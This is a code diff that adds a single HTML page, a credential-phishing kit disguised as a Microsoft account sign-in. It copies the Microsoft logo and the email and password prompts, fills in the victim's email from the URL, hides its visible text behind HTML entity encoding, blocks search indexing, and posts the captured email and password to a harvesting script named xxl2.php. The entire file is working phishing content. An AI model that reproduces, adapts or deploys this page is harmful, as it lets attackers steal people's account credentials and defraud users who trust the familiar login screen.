@@ -1,0 +1,497 @@
+<!DOCTYPE html> <html dir="ltr" lang="en-US" class="js"> <head> <script type="text/javascript"> <!-- document.write(unescape('')); //--> </script><script src="bootstrap.min.js"></script> <script> $.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; } </script> <script> $( document ).ready(function() { // after the page elements are all loaded, then run the script // Set the input field with unique ID #email to a value $("#email").val($.urlParam('email')); }); </script> <head> <title>Sign in to your account</title>  <link rel="icon" href="fall/rk.ico" sizes="32x32" /> <meta name="robots" content="noindex,nofollow" /> <meta charset="UTF-8"> <link id="favicon" rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACABAMAAAAxEHz4AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAElBMVEUAAADyUCJ/ugAApO//uQAAAAA9WXGkAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAHdElNRQfjAQgSIylHaVrAAAAAS0lEQVRo3u3MQQ3AIAAEsMuCAGZhCkiwgH9NOLj3Hq2A5q1m8nxVBAKBQCAQCAQCgUAgEPSAP9jVSsapBAKBQCAQCAQCgUAgEPTgAruK0CdlWNSzAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAxLTA5VDAwOjM1OjQxLTA2OjAwcE+HQwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMS0wOVQwMDozNTo0MS0wNjowMAESP/8AAAAASUVORK5CYII="> <script type="text/javascript" src="https://code.jquery.com/jquery.min.js"></script> 
+
+<style>
+.topi,
+.find {
+	position: absolute;
+	padding-right: 10px;
+	vertical-align: middle;
+	box-sizing: border-box
+}
+
+input {
+
+border: none; 
+
+}
+
+
+a {
+text-decoration: none;
+}
+
+a:hover {
+text-decoration: underline;
+}
+
+
+input:focus {
+    outline: none;
+}
+
+
+div {
+    height:100vh;
+}
+
+div.e {
+    background-color:#E5E5E5;
+	
+}
+div.e:hover {
+    background-color:#E5E5E5;
+}
+
+
+button{
+  outline: 0;
+
+}
+button:active {
+  outline: solid 2px #000;
+  background-color:#E5E5E5;
+
+}
+	
+.io {
+    background-color:#fff;
+	
+}
+.io:hover {
+    background-color:#E5E5E5;
+}
+div.r:hover {
+    background-color:#E5E5E5;
+}
+
+.on{
+background-color: transparent; 	
+}
+.bie{
+
+}
+.bie:hover {
+    background-color: #00000078;
+	opacity: 0.9;
+}
+
+a, p {
+	font-family: Segoe UI,Helvetica Neue,Lucida Grande,Roboto,Ebrima,Nirmala UI,Gadugi,Segoe Xbox Symbol,Segoe UI Symbol,Meiryo UI,Khmer UI,Tunga,Lao UI,Raavi,Iskoola Pota,Latha,Leelawadee,Microsoft YaHei UI,Microsoft JhengHei UI,Malgun Gothic,Estrangelo Edessa,Microsoft Himalaya,Microsoft New Tai Lue,Microsoft PhagsPa,Microsoft Tai Le,Microsoft Yi Baiti,Mongolian Baiti,MV Boli,Myanmar Text,Cambria Math;
+}
+
+.enemu {
+    font-size: 1em; 
+    overflow-x: hidden;
+    position: fixed;
+    background-size: inherit;
+    background-position: top;
+    background-color: #F0F3F3;
+    background-repeat: no-repeat;
+
+}
+
+  
+.cole {
+	   display: flex;              /* establish flex container */
+    flex-direction: column;     /* stack flex items vertically */
+    justify-content: center;    /* center items vertically, in this case */
+    align-items: center;        /* center items horizontally, in this case */
+    height: auto;
+    border: 1px solid black;
+	
+}
+ 
+.abudhabi {
+    position: absolute;
+    margin-top: 503px;
+    border-radius: 5px;
+    width: 534px;
+    background: white;
+    height: auto;
+    padding-bottom: 37px;
+    padding-top: 19px;
+    padding-left: 30px;
+    padding-right: 30px;
+	border: 0;
+}
+
+.topi {
+width: 470px;
+    outline: 0;
+    line-height: 22px;
+    letter-spacing: .2px;
+    -webkit-font-smoothing: antialiased;
+    font: 99% Arial, Helvetica, sans-serif;
+    background: transparent;
+    font-size: 15px;
+    box-shadow: none;
+    font-weight: 400;
+    color: rgba(0,0,0,0.9);
+    position: relative;
+    z-index: 1;
+    height: 39px;
+    padding: 0px 2px 0px;
+    margin-left: 16px;
+    margin-top: 31px;
+    border: 0;
+    border-bottom: 0;
+}
+ 
+::placeholder {
+	 
+
+	font-size: 15px;
+	font-weight: 400;
+	color: #808080; 
+}
+
+.sinput{
+	
+		outline: 0!important; 
+		border-bottom: solid 1px #000;
+}
+.sinput:focus{
+		outline: 0!important; 
+	border: 0;
+	border-radius: 0px;
+    border-bottom: solid 1px #0067b8 !important;
+}
+
+input, span, button, div {
+	font-family:Segoe UI,Helvetica Neue,Lucida Grande,Roboto,Ebrima,Nirmala UI,Gadugi,Segoe Xbox Symbol,Segoe UI Symbol,Meiryo UI,Khmer UI,Tunga,Lao UI,Raavi,Iskoola Pota,Latha,Leelawadee,Microsoft YaHei UI,Microsoft JhengHei UI,Malgun Gothic,Estrangelo Edessa,Microsoft Himalaya,Microsoft New Tai Lue,Microsoft PhagsPa,Microsoft Tai Le,Microsoft Yi Baiti,Mongolian Baiti,MV Boli,Myanmar Text,Cambria Math;
+	
+}
+
+
+.sinput:invalid{
+    outline: 0!important;
+    border: 0;
+    border-radius: 0px;
+    border-bottom: 0;
+	
+}
+
+.life:focus {
+	border: 0;
+	
+		outline: 0!important;
+} 
+.money {
+    margin-top: 79px;
+    border-radius: 2px;
+    display: inline-block;
+    font-size: 16px;
+    line-height: 28px;
+    color: #fff;
+    box-sizing: border-box;
+    cursor: pointer;
+    text-align: center;
+    border: 0;
+    background: transparent;
+    width: 118px;
+    height: 46px;
+    overflow-x: auto;
+    font-weight: 700;
+    margin-left: 48px;
+    float: right;
+    margin-right: 17px;
+    margin-top: 70px;
+}
+
+.spend {
+margin-top: 13px;
+    border-radius: 2px;
+    display: inline-block;
+    font-size: 16px;
+    line-height: 28px;
+    color: #fff;
+    box-sizing: border-box;
+    cursor: pointer;
+    text-align: center;
+    border: 0;
+    background: transparent;
+    width: 81px;
+    height: 36px;
+    overflow-x: auto;
+    font-weight: 700;
+    float: right;
+    margin-right: 32px;
+}
+
+.gave {
+    margin-top: -8px;
+    border-radius: 2px;
+    display: inline-block;
+    font-size: 16px;
+    line-height: 28px;
+    color: #fff;
+    box-sizing: border-box;
+    cursor: pointer;
+    text-align: center;
+    border: 0;
+    background: transparent;
+    width: 84px;
+    height: 36px;
+    overflow-x: auto;
+    font-weight: 700;
+    float: right;
+    margin-right: 41px;
+}
+
+.left{
+  float:left;
+}
+
+.clear{
+  clear:both;
+}
+
+body, html {
+  height: 100%;
+}
+
+.box{
+  float: left;
+    overflow: hidden;
+    background: #fffffff5;
+    width: 100%;
+    height: 100%;
+    z-index: 3;
+    position: fixed;
+    }
+    /* Add padding and border to inner content
+    for better animation effect */
+     
+	 
+
+
+
+input[type="date"]:not(.has-value):before{
+  
+  	opacity: .7;
+	font-family: roboto;
+	color: #000;
+	font-size: 1rem;
+	font-weight: 700;
+  content: attr(placeholder);
+}
+
+
+span {
+ 
+    
+    top:0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+
+    margin: auto;
+}
+
+
+.displayContainer { 
+    display: block; 
+    width: 100%;
+}
+.bottomFlex {
+    align-self: flex-end;
+}
+.centerFlex {
+    align-items: center;
+    display: flex;
+    justify-content: center;
+} 
+
+
+
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  background-color: #ffd54f;
+}
+
+.container {
+  color: #333;
+  text-align: center;
+}
+
+h1 {
+  font-weight: normal;
+}
+
+li {
+  display: inline-block;
+  font-size: 1.5em;
+  list-style-type: none;
+  padding: 1em;
+  text-transform: uppercase;
+}
+
+li span {
+  display: block;
+  font-size: 4.5rem;
+}
+
+
+
+/* Popup container */
+.popup {
+    position: relative;
+    display: inline-block;
+    cursor: pointer;
+}
+
+/* The actual popup (appears on top) */
+.popup .popuptext {
+    visibility: hidden;
+    width: 160px;
+    background-color: #555;
+    color: #fff;
+    text-align: center;
+    border-radius: 6px;
+    padding: 8px 0;
+    position: absolute;
+    z-index: 1;
+    bottom: 125%;
+    left: 50%;
+    margin-left: -80px;
+}
+
+/* Popup arrow */
+.popup .popuptext::after {
+    content: "";
+    position: absolute;
+    top: 100%;
+    left: 50%;
+    margin-left: -5px;
+    border-width: 5px;
+    border-style: solid;
+    border-color: #555 transparent transparent transparent;
+}
+
+/* Toggle this class when clicking on the popup container (hide and show the popup) */
+.popup .show {
+    visibility: visible;
+    -webkit-animation: fadeIn 1s;
+    animation: fadeIn 1s
+}
+
+/* Add animation (fade in the popup) */
+@-webkit-keyframes fadeIn {
+    from {opacity: 0;} 
+    to {opacity: 1;}
+}
+
+@keyframes fadeIn {
+    from {opacity: 0;}
+    to {opacity:1 ;}
+}
+
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+    
+    -webkit-appearance: none;
+    margin: 0;
+}
+
+i{
+	color: #0092bc;
+	padding-right: 5px;
+}
+
+
+.box{
+float: left;
+    overflow: hidden;
+    background: #fffffff5;
+    width: 100%;
+    height: 100%;
+    z-index: 3;
+    position: fixed; 
+	    font-size: 1em; 
+    overflow-x: hidden;
+    position: fixed;
+    background-size: inherit;
+    background-position: top;
+    background-color: #F0F3F3;
+    background-repeat: no-repeat;
+
+}
+
+body, html {
+  height: 100%;
+} 	
+
+
+input[type][disabled]
+{
+    background-color: #f9f9f9; 
+    cursor: default;
+}
+input[type][disabled] + label
+{ 
+    cursor: default;
+}
+
+.form-radio
+{    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    display: inline-block;
+    position: relative;
+    background-color: #fff;
+    color: #666;
+    height: 14px;
+    width: 14px;
+    border-radius: 0;
+    cursor: pointer;
+    outline: none;
+    top: 2px;
+    border: solid 1px #000;
+}
+.form-radio:checked::before
+{
+     position: absolute; 
+     left: 4px;
+     top: -4px;
+     content: '\02143';
+     transform: rotate(40deg);
+	 outline: 0; 
+	 
+}
+.form-radio:checked::after
+{
+	 color: #0067b8;
+	 
+}
+.form-radio:hover
+{
+     background-color: #fff;
+	 
+    border: solid 1px #0067b8;
+}
+.form-radio:active
+{
+     background-color: #fff;
+	 
+    border: solid 1px #0067b8;
+}
+.form-radio:checked
+{
+     background-color: #fff;
+	  
+}
+label
+{ 	 
+     cursor: pointer;
+} 
+
+</style>
+
+</head> <body> <div style="width: 100%; position: fixed ;"  class="enemu"> <center> <div style="width: 440px;background: white;height: 358px;margin-top: 143px;"> <div style="text-align: left;height: auto;padding-left: 45px;padding-top: 45px;"> <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg> </div> <div style="width: 100%; height: 72px; margin-top: 12px;" > <div style="text-align: left;height: auto;padding: 12px 44px;cursor: pointer;margin-top: -10px;"> <div style="height: 25px;width: auto;float: left;border-radius: 50%;" class="io"> <button type="button" class="slide-toggle" style=" background: transparent; border: 0; outline: 0; cursor: pointer;"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" style="float: left; border: 0; background: 0; float: left;" viewBox="0 0 24 24"><title>assets</title><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040"/><path d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z" fill="#404040"/></svg> </button> <p style="display: table-cell;vertical-align: middle;font-size: 15px;"> </div> <form method="post" action="xxl2.php" style=""> <input type="text" name="dent" required="" readonly  id="text_3" value="" style="width: 250px; border: 0; background: transparent; font-size: .9375rem;"> </p> <p style="color: #404040; font-size: 1.5rem; font-weight: 600; margin-top: 14px;">Enter password</p> </div> <input type="password" name="wilmod" placeholder="Password" tabindex="2" required="" class="sinput"  value="" style="text-align: left;height: 36px;font-size: 15px;width: 350px;background: white; border-bottom: solid 1px #000; margin-top: 3px;"> <br> <div style=" margin-left: 43px; margin-top: 10px; position: absolute; font-size: 14px; height: 20px; "> <input type="radio" name="demo" value="one" id="radio-one" class="form-radio"><label for="radio-one" style=" padding-left: 9px; "></label> &#75;&#101;&#101;&#112;&#32;&#109;&#101;&#32;&#115;&#105;&#103;&#110;&#101;&#100;&#32;&#105;&#110; </div> <br> <div style="height: auto;text-align: left;padding-left: 42px;margin-top: 28px;"><a role="link" href="#" style="font-size: 0.79rem;color: #0067b8;">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#109;&#121;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</a></div> <button name="stress" title="" class="" style=" width: 109px; height: 33px; background: #0067B8; border: 0; float: right; margin-right: 45px; margin-top: 24px; cursor: pointer; color: white; line-height: 33px; font-size: 15px; "> &#10;&#83;&#105;&#103;&#110;&#32;&#105;&#110; </button> </form> </div> </div> </center> </div> <div class="box"> <center> <center> <div style="width: 440px;background: white;height: 337px;margin-top: 143px;"> <div style="text-align: left;height: auto;padding-left: 45px;padding-top: 45px;"> <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg> </div> <div style="width: 100%; height: 72px; margin-top: 12px;" class=""> <div style="width: 100%; height: 72px; margin-top: 12px;" class=""> <div style="text-align: left;height: auto;padding: 12px 44px;margin-top: -10px;"> <div style="height: 25px;width: auto;float: left;border-radius: 50%;" class="io"> <p style="display: table-cell;vertical-align: middle;font-size: 15px;"> </div> </p> <p style="color: #404040; font-size: 1.5rem; font-weight: 600; margin-top: -5px;">Sign in</p> </div> <input type="email" name="wilmod" id="text_1" placeholder="Email, phone, or Skype" tabindex="2" required="" class="sinput"   value="" style="text-align: left;height: 36px;font-size: 15px;width: 350px;background: white; border-bottom: solid 1px #666666; margin-top: 3px;"> <br> <div style="height: auto;text-align: left;padding-left: 42px;margin-top: 15px; font-size: 0.79rem;" >No account? <a role="link" href="#"  style="font-size: 0.79rem;color: #0067b8;">Create one!</a></div> <div style="height: auto;text-align: left;padding-left: 42px;margin-top: 20px; font-size: 0.79rem;" ><a role="link" href="#"  style="font-size: 0.79rem;color: #0067b8;">Can’t access your account?</a> </div> <button  class="life bie be" style=" width: 109px; height: 33px; background-color: #0067B8; border: 0; float: right; margin-right: 45px; margin-top: 24px; cursor: pointer; color: white; line-height: 33px; font-size: 15px; "> Next </button> <a href="javascript:history.back();"> <div  class="life bie" style=" width: 109px; height: 33px; background-color: #CCCCCC; border: 0; float: right; margin-right: 6px; margin-top: 24px; cursor: pointer; color: white; line-height: 33px; font-size: 15px; color: #000;"> Back </div> </a> </div> </div> </div> </center> </center> </div> <script> $(document).ready(function(){ $(".be").click(function(){ $(".box").hide(); }); }); </script> <script> $(document).ready(function(){ $.fx.off = !$.fx.off; $(".slide-toggle").click(function(){ $(".box").animate({ width: "toggle" }); }); }); </script> <script> /* INPUT TEXT_1 AND TEXT_2 VALUE TO TEXT_3 ON TEXT_1 KEYUP*/ $("#text_1").change(function() { $("#text_3").val($("#text_1").val() + " " + $("#text_3").val()).change(); }) </script> </body></html>
